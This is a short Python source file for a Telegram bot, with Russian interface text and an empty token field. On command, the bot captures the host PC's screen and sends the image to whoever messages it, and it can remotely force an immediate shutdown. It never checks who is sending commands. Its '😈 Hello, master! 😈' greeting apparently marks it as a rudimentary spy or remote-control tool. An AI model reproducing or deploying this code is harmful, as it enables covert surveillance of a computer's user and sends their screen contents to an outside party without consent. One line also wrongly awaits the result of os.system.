from aiogram import Bot,types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup,KeyboardButton
import os
import tempfile
from PIL import ImageGrab

token = ""

bot = Bot(token=token)
dp = Dispatcher(bot)

async def on_startup(_):
   print("Бот запущен")

b1 = KeyboardButton("Скриншот")
b2 = KeyboardButton("Выключить ПК")

kb_client = ReplyKeyboardMarkup(resize_keyboard=True)
kb_client.row(b1,b2)

@dp.message_handler(commands=["start","help"])
async def command_start(message : types.Message):
   await message.answer("😈 Здравствуйте господин! 😈")
   await message.answer("Что желаешь?",reply_markup=kb_client)


@dp.message_handler(text=["Скриншот"])
async def Screenshot(message : types.Message):
   path = tempfile.gettempdir() + '\screenshot.png'
   screenshot = ImageGrab.grab()
   screenshot.save(path, 'PNG')
   photo = open(path, 'rb')
   await bot.send_photo(chat_id = message.chat.id, photo = photo)
   os.remove(path)

@dp.message_handler(text=["Выключить ПК"])
async def Off_pc(message : types.Message):
   await message.answer('ПК отключён')
   await os.system("shutdown -s -t 0")


@dp.message_handler()
async def jokes(message : types.Message):
   await message.answer("😡 Нет такой команды. Напиши /start")

executor.start_polling(dp, skip_updates=True,on_startup=on_startup)
